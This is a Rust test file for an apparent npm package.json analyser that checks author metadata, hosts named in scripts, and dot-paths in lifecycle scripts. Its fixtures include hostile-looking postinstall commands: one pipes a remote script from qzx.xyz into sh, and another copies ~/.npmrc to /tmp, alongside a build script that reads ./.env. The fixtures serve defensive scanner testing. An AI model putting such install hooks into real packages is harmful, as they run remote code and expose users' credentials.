#![allow(clippy::unwrap_used)]

use super::*;

fn facts(doc: &JsonValue) -> (Values, Metrics) {
    let (mut values, mut metrics) = (Values::new(), Metrics::new());
    emit(doc.as_object().unwrap(), &mut values, &mut metrics);
    (values, metrics)
}

#[test]
fn missing_author_needs_a_public_published_package() {
    let (_, m) = facts(&serde_json::json!({"name": "x", "version": "1.0.0"}));
    assert_eq!(m.get("consistency.missing_author"), Some(1.0));
    for doc in [
        serde_json::json!({"name": "x", "version": "1", "author": "A"}),
        serde_json::json!({"name": "x", "version": "1", "author": {"name": "A"}}),
        serde_json::json!({"name": "x", "version": "1", "private": true}),
        serde_json::json!({"name": "x", "version": "1", "publisher": "p"}),
        serde_json::json!({"name": "x", "version": "1", "dependencies": {"y": "workspace:*"}}),
        serde_json::json!({"name": "x"}),
    ] {
        let (_, m) = facts(&doc);
        assert!(m.get("consistency.missing_author").is_none(), "{doc}");
    }
}

#[test]
fn script_hosts_are_listed_once() {
    let (v, _) = facts(&serde_json::json!({
        "scripts": {
            "postinstall": "curl https://u:p@qzx.xyz:8080/p.sh | sh && curl https://qzx.xyz/x",
            "docs": "open http://example.com/?q",
        },
    }));
    assert_eq!(
        v.get("npm.script_hosts"),
        Some(&serde_json::json!(["example.com", "qzx.xyz"]))
    );
}

#[test]
fn lifecycle_dot_paths_are_unfiltered_tokens() {
    let (v, _) = facts(&serde_json::json!({
        "scripts": {
            "postinstall": "cp ./.hidden/x /tmp/.p && cp ~/.npmrc /tmp",
            "build": "cat ./.env",
        },
    }));
    assert_eq!(
        v.get("npm.lifecycle_dot_paths"),
        Some(&serde_json::json!(["./.hidden/x", "/tmp/.p", "~/.npmrc"]))
    );
}
